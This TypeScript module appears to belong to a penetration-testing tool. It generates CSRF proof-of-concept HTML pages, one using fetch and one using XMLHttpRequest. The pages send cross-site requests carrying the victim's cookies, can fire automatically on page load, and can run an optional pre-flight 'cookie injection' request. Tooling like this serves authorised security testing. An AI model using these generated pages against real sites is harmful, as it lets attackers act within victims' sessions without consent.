import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString, extractPreflightUrl } from './types';

/**
 * Generates an AJAX Fetch / XMLHttpRequest based CSRF PoC.
 */
export function generateFetchPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const delayMs = options.delayMs || 0;
  const buttonText = options.buttonText || 'Trigger Exploit';
  const targetUrl = request.url;
  const method = request.method.toUpperCase();

  const bodyData = request.body || '';
  const isJson = bodyData.startsWith('{') || bodyData.startsWith('[');

  const preflight =
    options.preflight?.enabled && options.preflight.url?.trim()
      ? extractPreflightUrl(options.preflight.url)
      : null;

  const preflightSnippet = preflight
    ? `      try {
        statusDiv.innerText = 'Status: Dispatched pre-flight trigger / cookie injection...';
        await fetch(${escapeJsString(preflight)}, { mode: 'no-cors' });
      } catch (e) {
        // Continue even if pre-flight fails or reflects non-CORS
      }\n`
    : '';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Fetch API CSRF PoC</title>
</head>
<body style="font-family: sans-serif; padding: 40px;">
  <h2>CSRF Verification Test (Fetch API)</h2>
  <p>Target: <code>${escapeHtml(targetUrl)}</code></p>
  <div id="status">Status: Waiting to trigger...</div>
  ${
    !autoSubmit
      ? `<br><button id="triggerBtn" style="padding: 8px 16px;">${escapeHtml(buttonText)}</button>`
      : ''
  }

  <script>
    async function executeCsrf() {
      const statusDiv = document.getElementById('status');
${preflightSnippet}      statusDiv.innerText = 'Status: Dispatched cross-site fetch request...';

      try {
        const response = await fetch(${escapeJsString(targetUrl)}, {
          method: ${escapeJsString(method)},
          mode: 'no-cors', // allows sending request even if server lacks CORS headers
          credentials: 'include', // sends ambient cookies cross-origin
          headers: {
            'Content-Type': ${escapeJsString(isJson ? 'text/plain' : 'application/x-www-form-urlencoded')},
          },
          body: ${escapeJsString(bodyData)},
        });

        statusDiv.innerText = 'Status: Payload sent successfully (Opaque response received)';
      } catch (err) {
        statusDiv.innerText = 'Status: Request failed - ' + err.message;
      }
    }

    ${
      autoSubmit
        ? `window.addEventListener('load', function() {
      setTimeout(executeCsrf, ${delayMs});
    });`
        : `document.getElementById('triggerBtn').addEventListener('click', executeCsrf);`
    }
  </script>
</body>
</html>`;
}

/**
 * Generates an XMLHttpRequest based CSRF PoC with withCredentials = true.
 */
export function generateXhrPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  const autoSubmit = options.autoSubmit !== false;
  const delayMs = options.delayMs || 0;
  const targetUrl = request.url;
  const method = request.method.toUpperCase();
  const bodyData = request.body || '';

  const preflight =
    options.preflight?.enabled && options.preflight.url?.trim()
      ? extractPreflightUrl(options.preflight.url)
      : null;

  const triggerBody = preflight
    ? `      var preImg = new Image();
      preImg.onload = preImg.onerror = function() {
        var xhr = new XMLHttpRequest();
        xhr.open(${escapeJsString(method)}, ${escapeJsString(targetUrl)}, true);
        xhr.withCredentials = true; // Include session cookies cross-origin
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(${escapeJsString(bodyData)});
      };
      preImg.src = ${escapeJsString(preflight)};`
    : `      var xhr = new XMLHttpRequest();
      xhr.open(${escapeJsString(method)}, ${escapeJsString(targetUrl)}, true);
      xhr.withCredentials = true; // Include session cookies cross-origin
      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      xhr.send(${escapeJsString(bodyData)});`;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XHR CSRF PoC</title>
</head>
<body>
  <script>
    function triggerXhr() {
${triggerBody}
    }

    ${
      autoSubmit
        ? `window.addEventListener('load', function() {
      setTimeout(triggerXhr, ${delayMs});
    });`
        : `// Call triggerXhr() manually to execute`
    }
  </script>
</body>
</html>`;
}
